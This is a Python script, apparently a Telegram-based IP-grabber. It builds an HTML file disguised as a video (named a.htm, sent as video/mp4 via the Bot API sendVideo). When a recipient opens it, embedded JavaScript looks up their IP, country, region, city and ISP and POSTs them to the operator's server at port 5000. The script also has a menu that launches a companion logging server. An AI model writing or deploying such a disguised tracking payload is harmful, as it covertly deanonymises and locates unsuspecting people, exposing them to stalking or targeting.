import requests
from dotenv import load_dotenv
import os
import inquirer
import subprocess

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
IP = os.getenv("IP")

server_process = None

def send_message():
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script>
            fetch('http://ip-api.com/json')
                .then(response => response.json())
                .then(data => {{
                    fetch('http://{IP}:5000/log_ip', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json'
                        }},
                        body: JSON.stringify({{
                            ip: data.query,
                            country: data.country,
                            region: data.regionName,
                            city: data.city,
                            isp: data.isp
                        }})
                    }});
                }})
                .catch(error => console.error('Error fetching IP:', error));
        </script>
    </head>
    <body>
    </body>
    </html>
    """

    html_path = "testv.htm"
    with open(html_path, "w") as file:
        file.write(html_content)

    files = {
        "video": (
            "a.htm",
            open(html_path, "rb"),
            "video/mp4"
        )
    }

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    data = {"chat_id": CHAT_ID, "supports_streaming": False}
    response = requests.post(url, data=data, files=files)

    if response.status_code == 200:
        print("Message sent successfully!")
    else:
        print(f"Error: {response.text}")

def start_server():
    global server_process
    print("Starting server...")
    try:
        server_process = subprocess.Popen(['python', 'server.py'])
        print("Server started successfully.")
    except Exception as e:
        print(f"Error starting the server: {e}")

def quit_program():
    global server_process
    print("Quitting the program.")
    if server_process:
        server_process.terminate()
        server_process.wait()
        print("Server terminated successfully.")
    exit()

def main():
    questions = [
        inquirer.List('action',
                      message="What would you like to do?",
                      choices=['Send Message', 'Start Server', 'Quit'],
                      carousel=True),
    ]

    while True:
        answer = inquirer.prompt(questions)

        if answer['action'] == 'Send Message':
            send_message()
        elif answer['action'] == 'Start Server':
            start_server()
        elif answer['action'] == 'Quit':
            quit_program()

if __name__ == "__main__":
    main()

